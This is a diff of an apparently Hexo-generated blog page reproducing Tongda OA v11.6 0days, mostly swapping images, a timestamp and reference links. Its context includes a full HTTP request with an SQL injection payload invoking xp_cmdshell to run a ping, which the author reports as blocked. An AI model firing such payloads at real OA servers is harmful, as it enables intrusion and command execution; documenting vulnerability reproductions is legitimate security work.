@@ -88,8 +88,8 @@
 <meta property="og:description" content="通达v11.6最近的几个0day，参考安译sec">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="http://yoursite.com/2020/08/23/通达OA-0day复现/1.png">
-<meta property="og:image" content="http://yoursite.com/2020/08/23/通达OA-0day复现/1.png">
-<meta property="og:updated_time" content="2020-08-30T13:27:40.911Z">
+<meta property="og:image" content="http://yoursite.com/2020/08/23/通达OA-0day复现/2.png">
+<meta property="og:updated_time" content="2020-08-31T14:39:51.608Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="通达OA 0day复现">
 <meta name="twitter:description" content="通达v11.6最近的几个0day，参考安译sec">
@@ -348,10 +348,11 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /general/email/sentbox/get_index_data.php?asc=0&amp;boxid=&amp;boxname=sentbox&amp;curnum=3&amp;emailtype=ALLMAIL&amp;keyword=sample%40email.tst&amp;orderby=exec%20master%20xp_cmdshell%20`ping%2010.10.10.1`%20--&amp;pagelimit=20&amp;tag=&amp;timestamp=1598069133&amp;total= HTTP/1.1</span><br><span class="line">Host: 10.10.10.130</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: USER_NAME_COOKIE=admin; SID_1=47bc070b; PHPSESSID=8s9lvu5r48t3i8smligo7j8tr4; OA_USER_ID=admin; KEY_RANDOMDATA=19400</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
 
 <p>这里和原文一样，因为检测到注释符，无法执行sql语句</p>
-<img src="/2020/08/23/通达OA-0day复现/1.png">
+<img src="/2020/08/23/通达OA-0day复现/2.png">
 
-<p>四、SQL注入</p>
-<p><a href="https://www.freebuf.com/articles/network/247265.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/247265.html</a><br><a href="https://mp.weixin.qq.com/s/lAm-gzqNguFXhSojFFQxDA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/lAm-gzqNguFXhSojFFQxDA</a></p>
+
+
+<p><a href="https://www.freebuf.com/articles/network/247265.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/247265.html</a><br><a href="https://mp.weixin.qq.com/s/lAm-gzqNguFXhSojFFQxDA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/lAm-gzqNguFXhSojFFQxDA</a><br><a href="https://mp.weixin.qq.com/s/XKZnsdY31N1_6gB9u8Yu8Q" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/XKZnsdY31N1_6gB9u8Yu8Q</a></p>
 
       
     </div>
